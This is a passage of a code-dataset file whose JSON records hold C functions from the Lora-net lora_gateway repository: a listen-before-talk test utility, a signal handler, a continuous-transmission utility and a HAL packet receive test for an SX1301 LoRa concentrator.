b/w -128 & 127\\n\");\n                    usage();\n                    return EXIT_FAILURE;\n                } else {\n                    rssi_offset = (int8_t)xi;\n                }\n                break;\n            default:\n                MSG(\"ERROR: argument parsing use -h option for help\\n\");\n                usage();\n                return EXIT_FAILURE;\n        }\n    }\n\n    MSG(\"INFO: Starting LoRa Gateway v1.5 LBT test\\n\");\n\n    /* configure signal handling */\n    sigemptyset(&sigact.sa_mask);\n    sigact.sa_flags = 0;\n    sigact.sa_handler = sig_handler;\n    sigaction(SIGQUIT, &sigact, NULL);\n    sigaction(SIGINT, &sigact, NULL);\n    sigaction(SIGTERM, &sigact, NULL);\n\n    /* Connect to concentrator */\n    i = lgw_connect(false, LGW_DEFAULT_NOTCH_FREQ);\n    if (i != LGW_REG_SUCCESS) {\n        MSG(\"ERROR: lgw_connect() did not return SUCCESS\\n\");\n        return EXIT_FAILURE;\n    }\n\n    /* Check if FPGA supports LBT */\n    lgw_fpga_reg_r(LGW_FPGA_FEATURE, &val);\n    if (TAKE_N_BITS_FROM((uint8_t)val, 2, 1) != true) {\n        MSG(\"ERROR: LBT is not supported (0x%x)\\n\", (uint8_t)val);\n        return EXIT_FAILURE;\n    }\n\n    /* Get FPGA lowest frequency for LBT channels */\n    lgw_fpga_reg_r(LGW_FPGA_LBT_INITIAL_FREQ, &val);\n    switch (val) {\n        case 0:\n            f_init = 915000000;\n            break;\n        case 1:\n            f_init = 863000000;\n            break;\n        default:\n            MSG(\"ERROR: LBT start frequency %d is not supported\\n\", val);\n            return EXIT_FAILURE;\n    }\n\n    /* Initialize 1st LBT channel freq if not given by user */\n    if (f_start == 0) {\n        f_start = f_init;\n    } else if (f_start < f_init) {\n        MSG(\"ERROR: LBT start frequency %u is not supported (f_init=%u)\\n\", f_start, f_init);\n        return EXIT_FAILURE;\n    }\n    MSG(\"FREQ: %u\\n\", f_start);\n\n    /* Configure SX127x and read few RSSI points */\n    lgw_setup_sx127x(f_init, MOD_FSK, LGW_SX127X_RXBW_100K_HZ, rssi_offset); /* 200KHz LBT channels */\n    for (i = 0; i < 100; i++) {\n        lgw_sx127x_reg_r(0x11, &rssi_value); /* 0x11: RegRssiValue */\n        MSG(\"SX127x RSSI:%i dBm\\n\", -(rssi_value/2));\n        wait_ms(10);\n    }\n\n    /* Configure LBT */\n    val = -2*(rssi_target_dBm);\n    lgw_fpga_reg_w(LGW_FPGA_RSSI_TARGET, val);\n    for (i = 0; i < LBT_CHANNEL_FREQ_NB; i++) {\n        freq_offset = (f_start - f_init)/100E3 + i*2; /* 200KHz between each channel */\n        lgw_fpga_reg_w(LGW_FPGA_LBT_CH0_FREQ_OFFSET+i, (int32_t)freq_offset);\n        if (scan_time_us == 5000) { /* configured to 128 by default */\n            lgw_fpga_reg_w(LGW_FPGA_LBT_SCAN_TIME_CH0+i, 1);\n        }\n    }\n\n    lgw_fpga_reg_r(LGW_FPGA_RSSI_TARGET, &val);\n    MSG(\"RSSI_TARGET = %d\\n\", val);\n    if (val != (-2*rssi_target_dBm)) {\n        MSG(\"ERROR: failed to read back RSSI target register value\\n\");\n        return EXIT_FAILURE;\n    }\n    for (i = 0; i < LBT_CHANNEL_FREQ_NB; i++) {\n        lgw_fpga_reg_r(LGW_FPGA_LBT_CH0_FREQ_OFFSET+i, &val);\n        lgw_fpga_reg_r(LGW_FPGA_LBT_SCAN_TIME_CH0+i, &val2);\n        MSG(\"CH_%i: freq=%u (offset=%i), scan_time=%u (%i)\\n\", i, (uint32_t)((val*100E3)+f_init), val, (val2==1)?5000:128, val2);\n    }\n    lgw_fpga_reg_r(LGW_FPGA_VERSION, &val);\n    MSG(\"FPGA VERSION = %d\\n\", val);\n\n    /* Enable LBT FSM */\n    lgw_fpga_reg_w(LGW_FPGA_CTRL_FEATURE_START, 1);\n\n    /* Start test */\n    while ((quit_sig != 1) && (exit_sig != 1)) {\n        MSG(\"~~~~\\n\");\n        for (channel = 0; channel < LBT_CHANNEL_FREQ_NB; channel++) {\n            /* Select LBT channel */\n            lgw_fpga_reg_w(LGW_FPGA_LBT_TIMESTAMP_SELECT_CH, channel);\n\n            /* Get last instant when the selected channel was free */\n            lgw_fpga_reg_r(LGW_FPGA_LBT_TIMESTAMP_CH, &val);\n            timestamp = (uint32_t)(val & 0x0000FFFF) * 256; /* 16bits (1LSB = 256\u00b5s) */\n            MSG(\" TIMESTAMP_CH%u = %u\\n\", channel, timestamp);\n        }\n\n        loop_cnt += 1;\n        wait_ms(400);\n    }\n\n    /* close SPI link */\n    i = lgw_disconnect();\n    if (i != LGW_REG_SUCCESS) {\n        MSG(\"ERROR: lgw_disconnect() did not return SUCCESS\\n\");\n        return EXIT_FAILURE;\n    }\n\n    MSG(\"INFO: Exiting LoRa Gateway v1.5 LBT test successfully\\n\");\n    return EXIT_SUCCESS;\n}", "path": "lora_gateway/util_lbt_test/src/util_lbt_test.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- PRIVATE FUNCTIONS DEFINITION ----------------------------------------- */\n", "func_signal": "static void sig_handler(int sigio)", "code": "{\n    if (sigio == SIGQUIT) {\n        quit_sig = 1;;\n    } else if ((sigio == SIGINT) || (sigio == SIGTERM)) {\n        exit_sig = 1;\n    }\n}", "path": "lora_gateway/libloragw/tst/test_loragw_gps.c", "commit_date": "2017-02-17 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- MAIN FUNCTION -------------------------------------------------------- */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n    static struct sigaction sigact; /* SIGQUIT&SIGINT&SIGTERM signal handling */\n\n    int i; /* loop and temporary variables */\n\n    /* Parameter parsing */\n    int option_index = 0;\n    static struct option long_options[] = {\n        {\"dig\", 1, 0, 0},\n        {\"dac\", 1, 0, 0},\n        {\"mix\", 1, 0, 0},\n        {\"pa\", 1, 0, 0},\n        {\"mod\", 1, 0, 0},\n        {\"sf\", 1, 0, 0},\n        {\"bw\", 1, 0, 0},\n        {\"br\", 1, 0, 0},\n        {\"fdev\", 1, 0, 0},\n        {\"bt\", 1, 0, 0},\n        {\"notch\", 1, 0, 0},\n        {0, 0, 0, 0}\n    };\n    unsigned int arg_u;\n    float arg_f;\n    char arg_s[64];\n\n    /* Application parameters */\n    uint32_t freq_hz = DEFAULT_FREQ_HZ;\n    uint8_t g_dig = DEFAULT_DIGITAL_GAIN;\n    uint8_t g_dac = DEFAULT_DAC_GAIN;\n    uint8_t g_mix = DEFAULT_MIXER_GAIN;\n    uint8_t g_pa = DEFAULT_PA_GAIN;\n    char mod[64] = DEFAULT_MODULATION;\n    uint8_t sf = DEFAULT_SF;\n    unsigned int bw_khz = DEFAULT_BW_KHZ;\n    float br_kbps = DEFAULT_BR_KBPS;\n    uint8_t fdev_khz = DEFAULT_FDEV_KHZ;\n    uint8_t bt = DEFAULT_BT;\n    uint32_t tx_notch_freq = DEFAULT_NOTCH_FREQ;\n\n    int32_t offset_i, offset_q;\n\n    /* RF configuration (TX fail if RF chain is not enabled) */\n    enum lgw_radio_type_e radio_type = LGW_RADIO_TYPE_SX1257;\n    struct lgw_conf_board_s boardconf;\n    struct lgw_conf_rxrf_s rfconf;\n    struct lgw_tx_gain_lut_s txlut;\n    struct lgw_pkt_tx_s txpkt;\n\n\n    /* Parse command line options */\n    while ((i = getopt_long (argc, argv, \"hud::f:r:\", long_options, &option_index)) != -1) {\n        switch (i) {\n            case 'h':\n                printf(\"~~~ Library version string~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\");\n                printf(\" %s\\n\", lgw_version_info());\n                printf(\"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\");\n                printf(\" -f      <float>  Tx RF frequency in MHz [800:1000]\\n\");\n                printf(\" -r      <int>    Radio type (SX1255:1255, SX1257:1257)\\n\");\n                printf(\" --notch <uint>   Tx notch filter frequency in KhZ [126..250]\\n\");\n                printf(\" --dig   <uint>   Digital gain trim, [0:3]\\n\");\n                printf(\"                   0:1, 1:7/8, 2:3/4, 3:1/2\\n\");\n                printf(\" --mix   <uint>   Radio Tx mixer gain trim, [0:15]\\n\");\n                printf(\"                   15 corresponds to maximum gain, 1 LSB corresponds to 2dB step\\n\");\n                printf(\" --pa    <uint>   PA gain trim, [0:3]\\n\");\n                printf(\" --mod   <char>   Modulation type ['LORA','FSK','CW']\\n\");\n                printf(\" --sf    <uint>   LoRa Spreading Factor, [7:12]\\n\");\n                printf(\" --bw    <uint>   LoRa bandwidth in kHz, [125,250,500]\\n\");\n                printf(\" --br    <float>  FSK bitrate in kbps, [0.5:250]\\n\");\n                printf(\" --fdev  <uint>   FSK frequency deviation in kHz, [1:250]\\n\");\n                printf(\" --bt    <uint>   FSK gaussian filter BT trim, [0:3]\\n\");\n                printf(\"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\");\n                return EXIT_SUCCESS;\n                break;\n\n            case 0:\n                if (strcmp(long_options[option_index].name,\"dig\") == 0) {\n                    i = sscanf(optarg, \"%u\", &arg_u);\n                    if ((i != 1) || (arg_u > 3)) {\n                        printf(\"ERROR: argument parsing of --dig argument. Use -h to print help\\n\");\n                        return EXIT_FAILURE;\n                    }\n                    else\n                    {\n                        g_dig = (uint8_t)arg_u;\n                    }\n                }\n                else if (strcmp(long_options[option_index].name,\"dac\") == 0) {\n                    i = sscanf(optarg, \"%u\", &arg_u);\n                    if ((i != 1) || (arg_u > 3)) {\n                        printf(\"ERROR: argument parsing of --dac argument. Use -h to print help\\n\");\n                        return EXIT_FAILURE;\n                    }\n                    else {\n                        g_dac = (uint8_t)arg_u;\n                    }\n                }\n                else if (strcmp(long_options[option_index].name,\"mix\") == 0) {\n                    i = sscanf(optarg, \"%u\", &arg_u);\n                    if ((i != 1) || (arg_u > 15)) {\n                        printf(\"ERROR: argument parsing of --mix argument. Use -h to print help\\n\");\n                        return EXIT_FAILURE;\n                    }\n                    else {\n                        g_mix = (uint8_t)arg_u;\n                    }\n                }\n                else if (strcmp(long_options[option_index].name,\"pa\") == 0) {\n                    i = sscanf(optarg, \"%u\", &arg_u);\n                    if ((i != 1) || (arg_u > 3)) {\n                        printf(\"ERROR: argument parsing of --pa argument. Use -h to print help\\n\");\n                        return EXIT_FAILURE;\n                    }\n                    else {\n                        g_pa = arg_u;\n                    }\n                }\n                else if (strcmp(long_options[option_index].name,\"mod\") == 0) {\n                    i = sscanf(optarg, \"%s\", arg_s);\n                    if ((i != 1) || ((strcmp(arg_s,\"LORA\") != 0) && (strcmp(arg_s,\"FSK\") != 0)  && (strcmp(arg_s,\"CW\") != 0))) {\n                        printf(\"ERROR: argument parsing of --mod argument. Use -h to print help\\n\");\n                        return EXIT_FAILURE;\n                    }\n                    else {\n                        sprintf(mod, \"%s\", arg_s);\n                    }\n                }\n                else if (strcmp(long_options[option_index].name,\"sf\") == 0) {\n                    i = sscanf(optarg, \"%u\", &arg_u);\n                    if ((i != 1) || (arg_u < 7) || (arg_u > 12)) {\n                        printf(\"ERROR: argument parsing of --sf argument. Use -h to print help\\n\");\n                        return EXIT_FAILURE;\n                    }\n                    else {\n                        sf = (uint8_t)arg_u;\n                    }\n                }\n                else if (strcmp(long_options[option_index].name,\"bw\") == 0) {\n                    i = sscanf(optarg, \"%u\", &arg_u);\n                    if ((i != 1) || ((arg_u != 125) && (arg_u != 250) && (arg_u != 500))) {\n                        printf(\"ERROR: argument parsing of --bw argument. Use -h to print help\\n\");\n                        return EXIT_FAILURE;\n                    }\n                    else {\n                        bw_khz = arg_u;\n                    }\n                }\n                else if (strcmp(long_options[option_index].name,\"br\") == 0) {\n                    i = sscanf(optarg, \"%f\", &arg_f);\n                    if ((i != 1) || (arg_f < 0.5) || (arg_f > 250)) {\n                        printf(\"ERROR: argument parsing of --br argument. Use -h to print help\\n\");\n                        return EXIT_FAILURE;\n                    }\n                    else {\n                        br_kbps = arg_f;\n                    }\n                }\n                else if (strcmp(long_options[option_index].name,\"fdev\") == 0) {\n                    i = sscanf(optarg, \"%u\", &arg_u);\n                    if ((i != 1) || (arg_u < 1) || (arg_u > 250)) {\n                        printf(\"ERROR: argument parsing of --fdev argument. Use -h to print help\\n\");\n                        return EXIT_FAILURE;\n                    }\n                    else {\n                        fdev_khz = (uint8_t)arg_u;\n                    }\n                }\n                else if (strcmp(long_options[option_index].name,\"bt\") == 0) {\n                    i = sscanf(optarg, \"%u\", &arg_u);\n                    if ((i != 1) || (arg_u > 3)) {\n                        printf(\"ERROR: argument parsing of --bt argument. Use -h to print help\\n\");\n                        return EXIT_FAILURE;\n                    }\n                    else {\n                        bt = (uint8_t)arg_u;\n                    }\n                }\n                else if (strcmp(long_options[option_index].name,\"notch\") == 0) {\n                    i = sscanf(optarg, \"%u\", &arg_u);\n                    if ((i != 1) || ((arg_u < 126) || (arg_u > 250))) {\n                        printf(\"ERROR: argument parsing of --notch argument. Use -h to print help\\n\");\n                        return EXIT_FAILURE;\n                    }\n                    else {\n                        tx_notch_freq = (uint32_t)arg_u * 1000U;\n                    }\n                }\n                else {\n                    printf(\"ERROR: argument parsing options. Use -h to print help\\n\");\n                    return EXIT_FAILURE;\n                }\n                break;\n\n        case 'f':\n            i = sscanf(optarg, \"%f\", &arg_f);\n            if ((i != 1) || (arg_f < 1)) {\n                printf(\"ERROR: argument parsing of -f argument. Use -h to print help\\n\");\n                return EXIT_FAILURE;\n            }\n            else {\n                freq_hz = (uint32_t)((arg_f * 1e6) + 0.5);\n            }\n            break;\n\n        case 'r':\n            i = sscanf(optarg, \"%u\", &arg_u);\n            switch (arg_u) {\n                case 1255:\n                    radio_type = LGW_RADIO_TYPE_SX1255;\n                    break;\n                case 1257:\n                    radio_type = LGW_RADIO_TYPE_SX1257;\n                    break;\n                default:\n                    printf(\"ERROR: argument parsing of -r argument. Use -h to print help\\n\");\n                    return EXIT_FAILURE;\n            }\n            break;\n\n        default:\n            printf(\"ERROR: argument parsing options. Use -h to print help\\n\");\n            return EXIT_FAILURE;\n        }\n    }\n\n    /* Configure signal handling */\n    sigemptyset( &sigact.sa_mask );\n    sigact.sa_flags = 0;\n    sigact.sa_handler = sig_handler;\n    sigaction( SIGQUIT, &sigact, NULL );\n    sigaction( SIGINT, &sigact, NULL );\n    sigaction( SIGTERM, &sigact, NULL );\n\n    /* Board config */\n    memset(&boardconf, 0, sizeof(boardconf));\n    boardconf.lorawan_public = true;\n    boardconf.clksrc = 1; /* Radio B is source by default */\n    lgw_board_setconf(boardconf);\n\n    /* RF config */\n    memset(&rfconf, 0, sizeof(rfconf));\n    rfconf.enable = true;\n    rfconf.freq_hz = freq_hz;\n    rfconf.rssi_offset = DEFAULT_RSSI_OFFSET;\n    rfconf.type = radio_type;\n    rfconf.tx_enable = true;\n    rfconf.tx_notch_freq = tx_notch_freq;\n    lgw_rxrf_setconf(TX_RF_CHAIN, rfconf);\n\n    /* Tx gain LUT */\n    memset(&txlut, 0, sizeof txlut);\n    txlut.size = 1;\n    txlut.lut[0].dig_gain = g_dig;\n    txlut.lut[0].pa_gain = g_pa;\n    txlut.lut[0].dac_gain = g_dac;\n    txlut.lut[0].mix_gain = g_mix;\n    txlut.lut[0].rf_power = 0;\n    lgw_txgain_setconf(&txlut);\n\n    /* Start the concentrator */\n    i = lgw_start();\n    if (i == LGW_HAL_SUCCESS) {\n        MSG(\"INFO: concentrator started, packet can be sent\\n\");\n    } else {\n        MSG(\"ERROR: failed to start the concentrator\\n\");\n        return EXIT_FAILURE;\n    }\n\n    /* fill-up payload and parameters */\n    memset(&txpkt, 0, sizeof(txpkt));\n    txpkt.freq_hz = freq_hz;\n    txpkt.tx_mode = IMMEDIATE;\n    txpkt.rf_chain = TX_RF_CHAIN;\n    txpkt.rf_power = 0;\n    if (strcmp(mod, \"FSK\") == 0) {\n        txpkt.modulation = MOD_FSK;\n        txpkt.datarate = br_kbps * 1e3;\n    } else {\n        txpkt.modulation = MOD_LORA;\n        switch (bw_khz) {\n            case 125: txpkt.bandwidth = BW_125KHZ; break;\n            case 250: txpkt.bandwidth = BW_250KHZ; break;\n            case 500: txpkt.bandwidth = BW_500KHZ; break;\n            default:\n                MSG(\"ERROR: invalid 'bw' variable\\n\");\n                return EXIT_FAILURE;\n        }\n        switch (sf) {\n            case  7: txpkt.datarate = DR_LORA_SF7;  break;\n            case  8: txpkt.datarate = DR_LORA_SF8;  break;\n            case  9: txpkt.datarate = DR_LORA_SF9;  break;\n            case 10: txpkt.datarate = DR_LORA_SF10; break;\n            case 11: txpkt.datarate = DR_LORA_SF11; break;\n            case 12: txpkt.datarate = DR_LORA_SF12; break;\n            default:\n                MSG(\"ERROR: invalid 'sf' variable\\n\");\n                return EXIT_FAILURE;\n        }\n    }\n    txpkt.coderate = CR_LORA_4_5;\n    txpkt.f_dev = fdev_khz;\n    txpkt.preamble = 65535;\n    txpkt.invert_pol = false;\n    txpkt.no_crc = true;\n    txpkt.no_header = true;\n    txpkt.size = 1;\n    txpkt.payload[0] = 0;\n\n    /* Overwrite settings */\n    lgw_reg_w(LGW_TX_MODE, 1); /* Tx continuous */\n    lgw_reg_w(LGW_FSK_TX_GAUSSIAN_SELECT_BT, bt);\n    if (strcmp(mod, \"CW\") == 0) {\n        /* Enable signal generator with DC */\n        lgw_reg_w(LGW_SIG_GEN_FREQ, 0);\n        lgw_reg_w(LGW_SIG_GEN_EN, 1);\n        lgw_reg_w(LGW_TX_OFFSET_I, 0);\n        lgw_reg_w(LGW_TX_OFFSET_Q, 0);\n    }\n\n    /* Send packet */\n    i = lgw_send(txpkt);\n\n    /* Recap all settings */\n    printf(\"SX1301 library version: %s\\n\", lgw_version_info());\n    if (strcmp(mod, \"LORA\") == 0) {\n        printf(\"Modulation: LORA SF:%d BW:%d kHz\\n\", sf, bw_khz);\n    }\n    else if (strcmp(mod, \"FSK\") == 0) {\n        printf(\"Modulation: FSK BR:%3.3f kbps FDEV:%d kHz BT:%d\\n\", br_kbps, fdev_khz, bt);\n    }\n    else if (strcmp(mod, \"CW\") == 0) {\n        printf(\"Modulation: CW\\n\");\n    }\n    switch(rfconf.type) {\n        case LGW_RADIO_TYPE_SX1255:\n            printf(\"Radio Type: SX1255\\n\");\n            break;\n        case LGW_RADIO_TYPE_SX1257:\n            printf(\"Radio Type: SX1257\\n\");\n            break;\n        default:\n            printf(\"ERROR: undefined radio type\\n\");\n            break;\n    }\n    printf(\"Frequency: %4.3f MHz\\n\", freq_hz/1e6);\n    printf(\"TX Gains: Digital:%d DAC:%d Mixer:%d PA:%d\\n\", g_dig, g_dac, g_mix, g_pa);\n    if (strcmp(mod, \"CW\") != 0) {\n        lgw_reg_r(LGW_TX_OFFSET_I, &offset_i);\n        lgw_reg_r(LGW_TX_OFFSET_Q, &offset_q);\n        printf(\"Calibrated DC offsets: I:%d Q:%d\\n\", offset_i, offset_q);\n    }\n\n    /* waiting for user input */\n    while ((quit_sig != 1) && (exit_sig != 1)) {\n        wait_ms(100);\n    }\n\n    /* clean up before leaving */\n    lgw_stop();\n\n    return 0;\n}", "path": "lora_gateway/util_tx_continuous/src/util_tx_continuous.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- MAIN FUNCTION -------------------------------------------------------- */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n    struct sigaction sigact; /* SIGQUIT&SIGINT&SIGTERM signal handling */\n\n    struct lgw_conf_board_s boardconf;\n    struct lgw_conf_rxrf_s rfconf;\n    struct lgw_conf_rxif_s ifconf;\n\n    struct lgw_pkt_rx_s rxpkt[4]; /* array containing up to 4 inbound packets metadata */\n    struct lgw_pkt_tx_s txpkt; /* configuration and metadata for an outbound packet */\n    struct lgw_pkt_rx_s *p; /* pointer on a RX packet */\n\n    int i, j;\n    int nb_pkt;\n    uint32_t fa = 0, fb = 0, ft = 0;\n    enum lgw_radio_type_e radio_type = LGW_RADIO_TYPE_NONE;\n    uint8_t clocksource = 1; /* Radio B is source by default */\n\n    uint32_t tx_cnt = 0;\n    unsigned long loop_cnt = 0;\n    uint8_t status_var = 0;\n    double xd = 0.0;\n    int xi = 0;\n\n    /* parse command line options */\n    while ((i = getopt (argc, argv, \"ha:b:t:r:k:\")) != -1) {\n        switch (i) {\n            case 'h':\n                usage();\n                return -1;\n                break;\n            case 'a': /* <float> Radio A RX frequency in MHz */\n                sscanf(optarg, \"%lf\", &xd);\n                fa = (uint32_t)((xd*1e6) + 0.5); /* .5 Hz offset to get rounding instead of truncating */\n                break;\n            case 'b': /* <float> Radio B RX frequency in MHz */\n                sscanf(optarg, \"%lf\", &xd);\n                fb = (uint32_t)((xd*1e6) + 0.5); /* .5 Hz offset to get rounding instead of truncating */\n                break;\n            case 't': /* <float> Radio TX frequency in MHz */\n                sscanf(optarg, \"%lf\", &xd);\n                ft = (uint32_t)((xd*1e6) + 0.5); /* .5 Hz offset to get rounding instead of truncating */\n                break;\n            case 'r': /* <int> Radio type (1255, 1257) */\n                sscanf(optarg, \"%i\", &xi);\n                switch (xi) {\n                    case 1255:\n                        radio_type = LGW_RADIO_TYPE_SX1255;\n                        break;\n                    case 1257:\n                        radio_type = LGW_RADIO_TYPE_SX1257;\n                        break;\n                    default:\n                        printf(\"ERROR: invalid radio type\\n\");\n                        usage();\n                        return -1;\n                }\n                break;\n            case 'k': /* <int> Concentrator clock source (Radio A or Radio B) */\n                sscanf(optarg, \"%i\", &xi);\n                clocksource = (uint8_t)xi;\n                break;\n            default:\n                printf(\"ERROR: argument parsing\\n\");\n                usage();\n                return -1;\n        }\n    }\n\n    /* check input parameters */\n    if ((fa == 0) || (fb == 0) || (ft == 0)) {\n        printf(\"ERROR: missing frequency input parameter:\\n\");\n        printf(\"  Radio A RX: %u\\n\", fa);\n        printf(\"  Radio B RX: %u\\n\", fb);\n        printf(\"  Radio TX: %u\\n\", ft);\n        usage();\n        return -1;\n    }\n\n    if (radio_type == LGW_RADIO_TYPE_NONE) {\n        printf(\"ERROR: missing radio type parameter:\\n\");\n        usage();\n        return -1;\n    }\n\n    /* configure signal handling */\n    sigemptyset(&sigact.sa_mask);\n    sigact.sa_flags = 0;\n    sigact.sa_handler = sig_handler;\n    sigaction(SIGQUIT, &sigact, NULL);\n    sigaction(SIGINT, &sigact, NULL);\n    sigaction(SIGTERM, &sigact, NULL);\n\n    /* beginning of LoRa concentrator-specific code */\n    printf(\"Beginning of test for loragw_hal.c\\n\");\n\n    printf(\"*** Library version information ***\\n%s\\n\\n\", lgw_version_info());\n\n    /* set configuration for board */\n    memset(&boardconf, 0, sizeof(boardconf));\n\n    boardconf.lorawan_public = true;\n    boardconf.clksrc = clocksource;\n    lgw_board_setconf(boardconf);\n\n    /* set configuration for RF chains */\n    memset(&rfconf, 0, sizeof(rfconf));\n\n    rfconf.enable = true;\n    rfconf.freq_hz = fa;\n    rfconf.rssi_offset = DEFAULT_RSSI_OFFSET;\n    rfconf.type = radio_type;\n    rfconf.tx_enable = true;\n    rfconf.tx_notch_freq = DEFAULT_NOTCH_FREQ;\n    lgw_rxrf_setconf(0, rfconf); /* radio A, f0 */\n\n    rfconf.enable = true;\n    rfconf.freq_hz = fb;\n    rfconf.rssi_offset = DEFAULT_RSSI_OFFSET;\n    rfconf.type = radio_type;\n    rfconf.tx_enable = false;\n    lgw_rxrf_setconf(1, rfconf); /* radio B, f1 */\n\n    /* set configuration for LoRa multi-SF channels (bandwidth cannot be set) */\n    memset(&ifconf, 0, sizeof(ifconf));\n\n    ifconf.enable = true;\n    ifconf.rf_chain = 1;\n    ifconf.freq_hz = -400000;\n    ifconf.datarate = DR_LORA_MULTI;\n    lgw_rxif_setconf(0, ifconf); /* chain 0: LoRa 125kHz, all SF, on f1 - 0.4 MHz */\n\n    ifconf.enable = true;\n    ifconf.rf_chain = 1;\n    ifconf.freq_hz = -200000;\n    ifconf.datarate = DR_LORA_MULTI;\n    lgw_rxif_setconf(1, ifconf); /* chain 1: LoRa 125kHz, all SF, on f1 - 0.2 MHz */\n\n    ifconf.enable = true;\n    ifconf.rf_chain = 1;\n    ifconf.freq_hz = 0;\n    ifconf.datarate = DR_LORA_MULTI;\n    lgw_rxif_setconf(2, ifconf); /* chain 2: LoRa 125kHz, all SF, on f1 - 0.0 MHz */\n\n    ifconf.enable = true;\n    ifconf.rf_chain = 0;\n    ifconf.freq_hz = -400000;\n    ifconf.datarate = DR_LORA_MULTI;\n    lgw_rxif_setconf(3, ifconf); /* chain 3: LoRa 125kHz, all SF, on f0 - 0.4 MHz */\n\n    ifconf.enable = true;\n    ifconf.rf_chain = 0;\n    ifconf.freq_hz = -200000;\n    ifconf.datarate = DR_LORA_MULTI;\n    lgw_rxif_setconf(4, ifconf); /* chain 4: LoRa 125kHz, all SF, on f0 - 0.2 MHz */\n\n    ifconf.enable = true;\n    ifconf.rf_chain = 0;\n    ifconf.freq_hz = 0;\n    ifconf.datarate = DR_LORA_MULTI;\n    lgw_rxif_setconf(5, ifconf); /* chain 5: LoRa 125kHz, all SF, on f0 + 0.0 MHz */\n\n    ifconf.enable = true;\n    ifconf.rf_chain = 0;\n    ifconf.freq_hz = 200000;\n    ifconf.datarate = DR_LORA_MULTI;\n    lgw_rxif_setconf(6, ifconf); /* chain 6: LoRa 125kHz, all SF, on f0 + 0.2 MHz */\n\n    ifconf.enable = true;\n    ifconf.rf_chain = 0;\n    ifconf.freq_hz = 400000;\n    ifconf.datarate = DR_LORA_MULTI;\n    lgw_rxif_setconf(7, ifconf); /* chain 7: LoRa 125kHz, all SF, on f0 + 0.4 MHz */\n\n    /* set configuration for LoRa 'stand alone' channel */\n    memset(&ifconf, 0, sizeof(ifconf));\n    ifconf.enable = true;\n    ifconf.rf_chain = 0;\n    ifconf.freq_hz = 0;\n    ifconf.bandwidth = BW_250KHZ;\n    ifconf.datarate = DR_LORA_SF10;\n    lgw_rxif_setconf(8, ifconf); /* chain 8: LoRa 250kHz, SF10, on f0 MHz */\n\n    /* set configuration for FSK channel */\n    memset(&ifconf, 0, sizeof(ifconf));\n    ifconf.enable = true;\n    ifconf.rf_chain = 1;\n    ifconf.freq_hz = 0;\n    ifconf.bandwidth = BW_250KHZ;\n    ifconf.datarate = 64000;\n    lgw_rxif_setconf(9, ifconf); /* chain 9: FSK 64kbps, on f1 MHz */\n\n    /* set configuration for TX packet */\n    memset(&txpkt, 0, sizeof(txpkt));\n    txpkt.freq_hz = ft;\n    txpkt.tx_mode = IMMEDIATE;\n    txpkt.rf_power = 10;\n    txpkt.modulation = MOD_LORA;\n    txpkt.bandwidth = BW_125KHZ;\n    txpkt.datarate = DR_LORA_SF9;\n    txpkt.coderate = CR_LORA_4_5;\n    strcpy((char *)txpkt.payload, \"TX.TEST.LORA.GW.????\" );\n    txpkt.size = 20;\n    txpkt.preamble = 6;\n    txpkt.rf_chain = 0;\n/*\n    memset(&txpkt, 0, sizeof(txpkt));\n    txpkt.freq_hz = F_TX;\n    txpkt.tx_mode = IMMEDIATE;\n    txpkt.rf_power = 10;\n    txpkt.modulation = MOD_FSK;\n    txpkt.f_dev = 50;\n    txpkt.datarate = 64000;\n    strcpy((char *)txpkt.payload, \"TX.TEST.LORA.GW.????\" );\n    txpkt.size = 20;\n    txpkt.preamble = 4;\n    txpkt.rf_chain = 0;\n*/\n\n    /* connect, configure and start the LoRa concentrator */\n    i = lgw_start();\n    if (i == LGW_HAL_SUCCESS) {\n        printf(\"*** Concentrator started ***\\n\");\n    } else {\n        printf(\"*** Impossible to start concentrator ***\\n\");\n        return -1;\n    }\n\n    /* once configured, dump content of registers to a file, for reference */\n    // FILE * reg_dump = NULL;\n    // reg_dump = fopen(\"reg_dump.log\", \"w\");\n    // if (reg_dump != NULL) {\n        // lgw_reg_check(reg_dump);\n        // fclose(reg_dump);\n    // }\n\n    while ((quit_sig != 1) && (exit_sig != 1)) {\n        loop_cnt++;\n\n        /* fetch N packets */\n        nb_pkt = lgw_receive(ARRAY_SIZE(rxpkt), rxpkt);\n\n        if (nb_pkt == 0) {\n            wait_ms(300);\n        } else {\n            /* display received packets */\n            for(i=0; i < nb_pkt; ++i) {\n                p = &rxpkt[i];\n                printf(\"---\\nRcv pkt #%d >>\", i+1);\n                if (p->status == STAT_CRC_OK) {\n                    printf(\" if_chain:%2d\", p->if_chain);\n                    printf(\" tstamp:%010u\", p->count_us);\n                    printf(\" size:%3u\", p->size);\n                    switch (p-> modulation) {\n                        case MOD_LORA: printf(\" LoRa\"); break;\n                        case MOD_FSK: printf(\" FSK\"); break;\n                        default: printf(\" modulation?\");\n                    }\n                    switch (p->datarate) {\n                        case DR_LORA_SF7: printf(\" SF7\"); break;\n                        case DR_LORA_SF8: printf(\" SF8\"); break;\n                        case DR_LORA_SF9: printf(\" SF9\"); break;\n                        case DR_LORA_SF10: printf(\" SF10\"); break;\n                        case DR_LORA_SF11: printf(\" SF11\"); break;\n                        case DR_LORA_SF12: printf(\" SF12\"); break;\n                        default: printf(\" datarate?\");\n                    }\n                    switch (p->coderate) {\n                        case CR_LORA_4_5: printf(\" CR1(4/5)\"); break;\n                        case CR_LORA_4_6: printf(\" CR2(2/3)\"); break;\n                        case CR_LORA_4_7: printf(\" CR3(4/7)\"); break;\n                        case CR_LORA_4_8: printf(\" CR4(1/2)\"); break;\n                        default: printf(\" coderate?\");\n                    }\n                 